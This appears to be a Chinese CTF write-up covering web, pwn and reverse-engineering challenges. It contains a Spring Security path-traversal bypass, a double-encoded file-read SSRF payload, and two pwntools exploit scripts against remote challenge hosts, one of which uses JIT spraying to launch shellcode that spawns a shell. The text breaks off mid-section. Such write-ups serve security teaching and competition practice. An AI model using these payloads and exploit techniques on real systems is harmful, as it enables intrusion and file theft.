<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> database mysql;</span><br><span class="line"><span class="keyword">CREATE TABLE</span> mysql.gtid_slave_pos (</span><br><span class="line">    `domain_id` <span class="type">int</span>(<span class="number">10</span>) unsigned <span class="keyword">NOT NULL</span>,</span><br><span class="line">    `sub_id` <span class="type">bigint</span>(<span class="number">20</span>) unsigned <span class="keyword">NOT NULL</span>,</span><br><span class="line">   `server_id` <span class="type">int</span>(<span class="number">10</span>) unsigned <span class="keyword">NOT NULL</span>,</span><br><span class="line">   `seq_no` <span class="type">bigint</span>(<span class="number">20</span>) unsigned <span class="keyword">NOT NULL</span>,</span><br><span class="line">    <span class="keyword">PRIMARY KEY</span> (`domain_id`,`sub_id`)</span><br><span class="line">   ) ENGINE<span class="operator">=</span>MyISAM <span class="keyword">DEFAULT</span> CHARSET<span class="operator">=</span>utf8 COMMENT<span class="operator">=</span><span class="string">&#x27;Replication slave GTID state&#x27;</span>;</span><br><span class="line">CHANGE MASTER <span class="keyword">TO</span></span><br><span class="line">    MASTER_HOST<span class="operator">=</span><span class="string">&#x27;192.168.2.203&#x27;</span>,</span><br><span class="line">    MASTER_USER<span class="operator">=</span><span class="string">&#x27;shukuang&#x27;</span>,</span><br><span class="line">    MASTER_PASSWORD<span class="operator">=</span><span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    MASTER_LOG_FILE<span class="operator">=</span><span class="string">&#x27;mysql-bin.000001&#x27;</span>,</span><br><span class="line">    MASTER_LOG_POS<span class="operator">=</span><span class="number">0</span>;</span><br><span class="line"><span class="keyword">START</span> SLAVE;</span><br><span class="line"><span class="keyword">show</span> slave status;</span><br></pre></td></tr></table></figure>

<p>参考连接：</p>
<p><a href="https://mariadb.com/kb/en/documentation/">https://mariadb.com/kb/en/documentation/</a></p>
<h2><span id="anyfileread">AnyFileRead</span><a href="#anyfileread" class="header-anchor"></a></h2><p>绕过SpringSecurity读flag，需要注意编码解析问题，用burp即可</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/admin/../flag</span><br></pre></td></tr></table></figure>

<h2><span id="ez-java-agagin">ez_java_agagin</span><a href="#ez-java-agagin" class="header-anchor"></a></h2> <!--  <link rel="Shortcut Icon" href="./Imagefile?url1=upload/favicon.ico" type="image/x-icon" /> 存在安全问题，已废弃-->

<p><img src="./20230821210708558.jpg" alt="img"></p>
<p>&#x2F;usr&#x2F;share&#x2F;java&#x2F;这个目录有java，file:&#x2F;&#x2F;&#x2F;列根目录发现flag文件，flag被过滤用二次编码绕</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/Imagefile?url1=file:///usr/share/java/../../../../%2566%256c%2561%2567</span><br></pre></td></tr></table></figure>

<h2><span id="ni-de-quan-xian-fang-zhao-wo-lai">你的权限放着我来</span><a href="#ni-de-quan-xian-fang-zhao-wo-lai" class="header-anchor"></a></h2><p><a href="http://b122e3c7-3f13-4c4b-8c92-9639c6ad9de5.wmctf.wm-team.cn/">http://b122e3c7-3f13-4c4b-8c92-9639c6ad9de5.wmctf.wm-team.cn/</a></p>
<p>&#x2F;api&#x2F;change</p>
<p>任意用户重置</p>
<p>重置<a href="mailto:&#106;&#111;&#109;&#x40;&#x72;&#x6f;&#111;&#x6d;&#107;&#101;&#46;&#x63;&#x6f;&#109;">jom@roomke.com</a>的密码 拿到flag flag{test_flag}</p>
<h1><span id="pwn">Pwn</span><a href="#pwn" class="header-anchor"></a></h1><h2><span id="blindless">Blindless</span><a href="#blindless" class="header-anchor"></a></h2><p>Libc大师题，改elf的linkmap的l_addr到backdoor，爆破1位，控制一下fini_array什么的l_info指向0</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> args.REMOTE :</span><br><span class="line">    sh = remote(<span class="string">&#x27;1.13.101.243&#x27;</span>,<span class="string">&#x27;27227&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    sh = process(<span class="string">&#x27;./main&#x27;</span>)</span><br><span class="line"></span><br><span class="line">script = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bpt</span>(<span class="params">addr_or_sym,bigFileOff=<span class="literal">False</span></span>):</span><br><span class="line">    <span class="keyword">global</span> script</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">type</span>(addr_or_sym) <span class="keyword">is</span> <span class="built_in">int</span>:</span><br><span class="line">        addr = addr_or_sym</span><br><span class="line">        <span class="keyword">if</span> addr &gt; <span class="number">0x400000</span> <span class="keyword">and</span> <span class="keyword">not</span> bigFileOff:</span><br><span class="line">            script += <span class="string">f&#x27;b * <span class="subst">&#123;addr:#x&#125;</span>\n&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            script += <span class="string">f&#x27;brva <span class="subst">&#123;addr:#x&#125;</span>\n&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> <span class="built_in">type</span>(addr_or_sym) <span class="keyword">is</span> <span class="built_in">str</span>:</span><br><span class="line">        script += <span class="string">&#x27;b &#x27;</span> + addr_or_sym + <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> <span class="built_in">type</span>(addr_or_sym) <span class="keyword">is</span> <span class="built_in">list</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> addr_or_sym:</span><br><span class="line">            bpt(i)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">b</span>(<span class="params">x=<span class="literal">None</span>,go=<span class="literal">False</span>,action=<span class="string">&#x27;&#x27;</span></span>):</span><br><span class="line">    <span class="keyword">global</span> script</span><br><span class="line">    <span class="keyword">if</span> x != <span class="literal">None</span>:</span><br><span class="line">        bpt(x)</span><br><span class="line">    <span class="keyword">if</span> go <span class="keyword">or</span> action != <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        script += <span class="string">&#x27;c\n&#x27;</span></span><br><span class="line">    script += action</span><br><span class="line">    gdb.attach(sh,script)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">code = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_off</span>(<span class="params">off</span>):</span><br><span class="line">    <span class="keyword">global</span> code</span><br><span class="line">    code += <span class="string">b&#x27;@&#x27;</span> + p32(off)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">ch</span>):</span><br><span class="line">    <span class="keyword">global</span> code</span><br><span class="line">    code += <span class="string">b&#x27;.&#x27;</span> + ch</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shift</span>():</span><br><span class="line">    <span class="keyword">global</span> code</span><br><span class="line">    code += <span class="string">b&#x27;&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shift_8</span>():</span><br><span class="line">    <span class="keyword">global</span> code</span><br><span class="line">    code += <span class="string">b&#x27;+&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">quit</span>():</span><br><span class="line">    <span class="keyword">global</span> code</span><br><span class="line">    code += <span class="string">b&#x27;q&#x27;</span></span><br><span class="line"></span><br><span class="line">data_size = <span class="number">0x200000</span></span><br><span class="line">sh.sendlineafter(<span class="string">b&#x27;data size\n&#x27;</span>,<span class="built_in">str</span>(data_size).encode())</span><br><span class="line"></span><br><span class="line"><span class="comment"># shift_8()</span></span><br><span class="line"></span><br><span class="line">linkmap_off = <span class="number">0x424180</span></span><br><span class="line"></span><br><span class="line">add_off(linkmap_off)</span><br><span class="line">write(<span class="string">b&#x27;\x09&#x27;</span>)</span><br><span class="line">shift()</span><br><span class="line">write(<span class="string">b&#x27;\x12&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add_off(<span class="number">0xa8</span>-<span class="number">1</span>)</span><br><span class="line">write(<span class="string">b&#x27;\x40&#x27;</span>)</span><br><span class="line">add_off(<span class="number">0x110</span>-<span class="number">0xa8</span>)</span><br><span class="line">write(<span class="string">b&#x27;\x40&#x27;</span>)</span><br><span class="line">add_off(<span class="number">0x120</span>-<span class="number">0x110</span>)</span><br><span class="line">write(<span class="string">b&#x27;\x40&#x27;</span>)</span><br><span class="line"></span><br><span class="line">quit()</span><br><span class="line"></span><br><span class="line">sh.sendlineafter(<span class="string">b&#x27;code size\n&#x27;</span>,<span class="built_in">str</span>(<span class="built_in">len</span>(code)).encode())</span><br><span class="line"></span><br><span class="line"><span class="comment"># b([&#x27;_dl_fini&#x27;,0x130e])</span></span><br><span class="line">sh.sendafter(<span class="string">b&#x27;your code\n&#x27;</span>,code)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h2><span id="jit">Jit</span><a href="#jit" class="header-anchor"></a></h2><p>Ida 7.7的i64</p>
<p>交互是输俩十六进制字符串</p>
<p>013f2eff883这样的</p>
<p>漏洞应该在generate_code函数</p>
<p>有效的opcode在check_code里</p>
<p>2k行看不动了</p>
<p>没必要看，只要测一下那些opcode代表的操作，就会发现有内存写的指令，同时还允许使用rbp为目标寄存器，就直接按他的逻辑写汇编改返回地址然后jit spray就完事了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> args.REMOTE :</span><br><span class="line">    sh = remote(<span class="string">&#x27;1.13.101.243&#x27;</span>,<span class="string">&#x27;26419&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    sh = process(<span class="string">&#x27;./jit&#x27;</span>)</span><br><span class="line"></span><br><span class="line">script = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bpt</span>(<span class="params">addr_or_sym,bigFileOff=<span class="literal">False</span></span>):</span><br><span class="line">    <span class="keyword">global</span> script</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">type</span>(addr_or_sym) <span class="keyword">is</span> <span class="built_in">int</span>:</span><br><span class="line">        addr = addr_or_sym</span><br><span class="line">        <span class="keyword">if</span> addr &gt; <span class="number">0x400000</span> <span class="keyword">and</span> <span class="keyword">not</span> bigFileOff:</span><br><span class="line">            script += <span class="string">f&#x27;b * <span class="subst">&#123;addr:#x&#125;</span>\n&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            script += <span class="string">f&#x27;brva <span class="subst">&#123;addr:#x&#125;</span>\n&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> <span class="built_in">type</span>(addr_or_sym) <span class="keyword">is</span> <span class="built_in">str</span>:</span><br><span class="line">        script += <span class="string">&#x27;b &#x27;</span> + addr_or_sym + <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> <span class="built_in">type</span>(addr_or_sym) <span class="keyword">is</span> <span class="built_in">list</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> addr_or_sym:</span><br><span class="line">            bpt(i)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">b</span>(<span class="params">x=<span class="literal">None</span>,go=<span class="literal">False</span>,action=<span class="string">&#x27;&#x27;</span></span>):</span><br><span class="line">    <span class="keyword">global</span> script</span><br><span class="line">    <span class="keyword">if</span> x != <span class="literal">None</span>:</span><br><span class="line">        bpt(x)</span><br><span class="line">    <span class="keyword">if</span> go <span class="keyword">or</span> action != <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        script += <span class="string">&#x27;c\n&#x27;</span></span><br><span class="line">    script += action</span><br><span class="line">    gdb.attach(sh,script)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">code = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">make_code</span>(<span class="params">op,r1=<span class="number">0</span>,r2=<span class="number">0</span>,off=<span class="number">0</span>,imm=<span class="number">0</span></span>):</span><br><span class="line">    <span class="keyword">global</span> code</span><br><span class="line">    payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    payload += p8(op)</span><br><span class="line">    payload += p8((r1 &lt;&lt; <span class="number">4</span>) + (r2 &amp; <span class="number">0xf</span>))</span><br><span class="line">    payload += p16(off)</span><br><span class="line">    payload += p32(imm)</span><br><span class="line">    <span class="comment"># code += payload</span></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line">mem = <span class="string">b&#x27;\x80\x88&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sd</span>():</span><br><span class="line">    sh.sendlineafter(<span class="string">b&#x27;Program: &#x27;</span>,binascii.hexlify(code))</span><br><span class="line">    sh.sendlineafter(<span class="string">b&#x27;Memory: &#x27;</span>,binascii.hexlify(mem))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_imm</span>(<span class="params">r,imm</span>):</span><br><span class="line">    <span class="keyword">global</span> code</span><br><span class="line">    code += make_code(<span class="number">7</span>,r2=r,imm=imm)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">reg_add</span>(<span class="params">dst,src</span>):</span><br><span class="line">    <span class="keyword">global</span> code</span><br><span class="line">    code += make_code(<span class="number">0xc</span>,r1=src,r2=dst)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x18 movabs </span></span><br><span class="line"><span class="comment"># 0xde jle</span></span><br><span class="line"><span class="comment"># 0x62-0x7b mov xxx ptr [r], r/imm</span></span><br><span class="line"><span class="comment"># 0x5 - 0xde jmp/jxx    </span></span><br><span class="line"><span class="comment"># 0xac xor</span></span><br><span class="line"><span class="comment"># 0xbc mov</span></span><br><span class="line"><span class="comment"># 0xc7 sar</span></span><br><span class="line"></span><br><span class="line">rax = <span class="number">0</span></span><br><span class="line">rdi = <span class="number">1</span></span><br><span class="line">rsi = <span class="number">2</span></span><br><span class="line">rdx = <span class="number">3</span></span><br><span class="line">r9 = <span class="number">4</span></span><br><span class="line">r8 = <span class="number">5</span></span><br><span class="line">rbx = <span class="number">6</span></span><br><span class="line">r13 = <span class="number">7</span></span><br><span class="line">r14 = <span class="number">8</span></span><br><span class="line">r15 = <span class="number">9</span></span><br><span class="line">rbp = <span class="number">10</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mov</span>(<span class="params">dst,src</span>):</span><br><span class="line">    <span class="keyword">global</span> code</span><br><span class="line">    code += make_code(<span class="number">0xbc</span>,r1=src,r2=dst)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mov_imm</span>(<span class="params">dst,imm</span>):</span><br><span class="line">    <span class="keyword">global</span> code</span><br><span class="line">    code += make_code(<span class="number">0xb7</span>,r2=dst,imm=imm)</span><br><span class="line"></span><br><span class="line">mov(rbx,rax)</span><br><span class="line">mov_imm(rdx,<span class="number">7</span>)</span><br><span class="line">mov(rdi,rax)</span><br><span class="line">mov_imm(rsi,<span class="number">0x2000</span>)</span><br><span class="line"></span><br><span class="line">mov_imm(rax,<span class="number">0xa</span>)</span><br><span class="line"></span><br><span class="line">add_imm(rbx,<span class="number">0x3b</span>)</span><br><span class="line"></span><br><span class="line">code += make_code(<span class="number">0x7b</span>,r1=rbx,r2=rbp,off=<span class="number">0x28</span>) <span class="comment"># mov qword ptr [rbp+0x28],rbx /// return address</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add32</span>(<span class="params">r,imm</span>):</span><br><span class="line">    <span class="keyword">global</span> code</span><br><span class="line">    code += make_code(<span class="number">0x4</span>,r2=r,imm=imm)</span><br><span class="line"></span><br><span class="line">tail = <span class="number">0x03eb0000</span></span><br><span class="line"></span><br><span class="line">sc = <span class="string">&#x27;&#x27;&#x27;syscall</span></span><br><span class="line"><span class="string">xor eax,eax</span></span><br><span class="line"><span class="string">push rsi;pop rdx;</span></span><br><span class="line"><span class="string">push rdi;pop rsi;</span></span><br><span class="line"><span class="string">push rax;pop rdi;</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> sc.splitlines():</span><br><span class="line">    add32(r15,u16(asm(i)) + tail)</span><br><span class="line"></span><br><span class="line"><span class="comment"># b(0x2947,go=True)   </span></span><br><span class="line"></span><br><span class="line">sd()</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">sh.sendline(<span class="string">b&#x27;\x90&#x27;</span> * <span class="number">0x100</span> + asm(shellcraft.sh()))</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h1><span id="re">Re</span><a href="#re" class="header-anchor"></a></h1><h2><span id="ezandroid">ezAndroid</span><a href="#ezandroid" class="header-anchor"></a></h2><p><img src="./20230821210707945.jpg" alt="img"></p>
<p>输入账号和密码，注册在native里，d810去混淆发现是rc4加密和aes加密，全部魔改了，通过动态调试找到rc4的key是12345678，他rc4魔改了后面有个异或i</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">a = [<span class="number">0xE9</span>, <span class="number">0x97</span>, <span class="number">0x64</span>, <span class="number">0xE6</span>, <span class="number">0x7E</span>, <span class="number">0xEB</span>, <span class="number">0xBD</span>, <span class="number">0xC1</span>, <span class="number">0xAB</span>, <span class="number">0x43</span>]</span><br><span class="line">b = [<span class="number">0</span>] * <span class="number">10</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    b[i] = a[i] ^ i</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(b[i]),end=<span class="string">&quot;,&quot;</span>)</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc4_main</span>(<span class="params">key = <span class="string">&quot;init_key&quot;</span>, message = <span class="string">&quot;init_message&quot;</span></span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;RC4解密主函数调用成功&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    s_box = rc4_init_sbox(key)</span><br><span class="line">    crypt = rc4_excrypt(message, s_box)</span><br><span class="line">    <span class="keyword">return</span> crypt</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc4_init_sbox</span>(<span class="params">key</span>):</span><br><span class="line">    s_box = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;原来的 s 盒：%s&quot;</span> % s_box)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        j = (j + s_box[i] + <span class="built_in">ord</span>(key[i % <span class="built_in">len</span>(key)])) % <span class="number">256</span></span><br><span class="line">        s_box[i], s_box[j] = s_box[j], s_box[i]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;混乱后的 s 盒：%s&quot;</span>% s_box)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> s_box</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc4_excrypt</span>(<span class="params">plain, box</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;调用解密程序成功。&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    plain = base64.b64decode(plain.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    plain = <span class="built_in">bytes</span>.decode(plain)</span><br><span class="line">    res = []</span><br><span class="line">    i = j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> plain:</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        j = (j + box[i]) % <span class="number">256</span></span><br><span class="line">        box[i], box[j] = box[j], box[i]</span><br><span class="line">        t = (box[i] + box[j]) % <span class="number">256</span></span><br><span class="line">        k = box[t]</span><br><span class="line">        res.append(<span class="built_in">chr</span>(<span class="built_in">ord</span>(s) + k))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;res用于解密字符串，解密后是：%res&quot;</span> %res)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    cipher = <span class="string">&quot;&quot;</span>.join(res)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;解密后的字符串是：%s&quot;</span> %cipher)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;解密后的输出(没经过任何编码):&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> cipher</span><br><span class="line">a=[<span class="number">0xe9</span>,<span class="number">0x96</span>,<span class="number">0x66</span>,<span class="number">0xe5</span>,<span class="number">0x7a</span>,<span class="number">0xee</span>,<span class="number">0xbb</span>,<span class="number">0xc6</span>,<span class="number">0xa3</span>,<span class="number">0x4a</span>]</span><br><span class="line">key=<span class="string">&quot;12345678&quot;</span></span><br><span class="line">s=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    s+=<span class="built_in">chr</span>(i)</span><br><span class="line">s=<span class="built_in">str</span>(base64.b64encode(s.encode(<span class="string">&#x27;utf-8&#x27;</span>)), <span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">rc4_main(key, s)</span><br></pre></td></tr></table></figure>

<p>得到账号，然后账号+123456作为key传入aes加密，这个加密魔改了sbox</p>
<p><img src="./20230821210708748.jpg" alt="img"></p>
<p>通过下面脚本求逆sbox</p>
